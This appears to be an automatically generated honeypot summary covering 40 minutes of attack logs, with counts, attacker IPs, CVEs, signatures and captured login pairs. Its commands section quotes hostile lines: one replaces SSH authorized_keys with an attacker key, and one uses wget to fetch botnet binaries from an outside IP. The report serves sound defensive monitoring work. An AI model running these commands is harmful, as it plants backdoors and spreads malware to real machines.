Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T07:01:32Z
**Timeframe Covered:** 2025-10-01T06:20:01Z to 2025-10-01T07:00:01Z
**Log Files Used:**
- agg_log_20251001T062001Z.json
- agg_log_20251001T064001Z.json
- agg_log_20251001T070001Z.json

### Executive Summary
This report summarizes 27,416 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie honeypot, with a significant number of attempts targeting SMB and SSH services. The most prominent attacking IP address was 161.35.152.121. Multiple CVEs were detected, with CVE-2019-11500 being the most frequent. Attackers attempted various commands, primarily focused on reconnaissance and establishing persistent access by modifying SSH authorized_keys.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 14,566
- Dionaea: 6,673
- Honeytrap: 2,253
- Suricata: 1,439
- Ciscoasa: 1,434
- Adbhoney: 62
- Redishoneypot: 28
- ConPot: 27
- H0neytr4p: 25
- Tanner: 29
- Mailoney: 838
- Honeyaml: 17
- Dicompot: 11
- Sentrypeer: 7
- Wordpot: 1
- Ipphoney: 2
- ElasticPot: 1
- Heralding: 3

**Top Attacking IPs:**
- 161.35.152.121: 11,140
- 159.192.136.127: 3,142
- 114.10.151.159: 1,264
- 196.218.240.91: 1,173
- 92.242.166.161: 822
- 45.130.190.34: 695
- 185.156.73.166: 366
- 185.156.73.167: 367
- 92.63.197.55: 362
- 92.63.197.59: 327
- 102.210.149.105: 387
- 218.161.90.126: 218
- 209.97.161.72: 208
- 103.179.56.44: 233
- 193.233.16.117: 319
- 14.63.217.28: 322
- 103.118.114.22: 228
- 34.80.155.91: 225
- 186.123.101.50: 189
- 14.103.195.87: 146

**Top Targeted Ports/Protocols:**
- 445: 6,527
- 22: 2,666
- 8333: 127
- TCP/1433: 77
- 1433: 64
- 27017: 34
- TCP/1080: 33
- 8888: 28
- 6379: 19
- 80: 34

**Most Common CVEs:**
- CVE-2019-11500
- CVE-2021-3449
- CVE-1999-0183
- CVE-2002-0013
- CVE-2002-0012

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `uname -a`
- `top`
- `whoami`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`
- `rm -rf /data/local/tmp/*`

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 47
- GPL INFO SOCKS Proxy attempt
- ET CINS Active Threat Intelligence Poor Reputation IP group 43
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- foundry/foundry
- root/2glehe5t24th1issZs
- superadmin/admin123
- root/nPSpP4PBW0
- test/zhbjETuyMffoL8F
- eric/eric123
- root/@12345
- usuario/1
- root/3245gs5662d34

**Files Uploaded/Downloaded:**
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

**HTTP User-Agents:**
- (No data)

**SSH Clients:**
- (No data)

**SSH Servers:**
- (No data)

**Top Attacker AS Organizations:**
- (No data)

### Key Observations and Anomalies
- The overwhelming number of attacks from 161.35.152.121 suggests a targeted or persistent campaign from this source.
- The consistent use of commands to download and execute `urbotnetisass` payloads from the same IP (94.154.35.154) indicates an automated botnet propagation attempt.
- Attackers frequently attempt to secure their access by modifying the `.ssh/authorized_keys` file, a common persistence technique.
- The variety of honeypots triggered showcases a broad spectrum of scanning and exploitation techniques being used by attackers.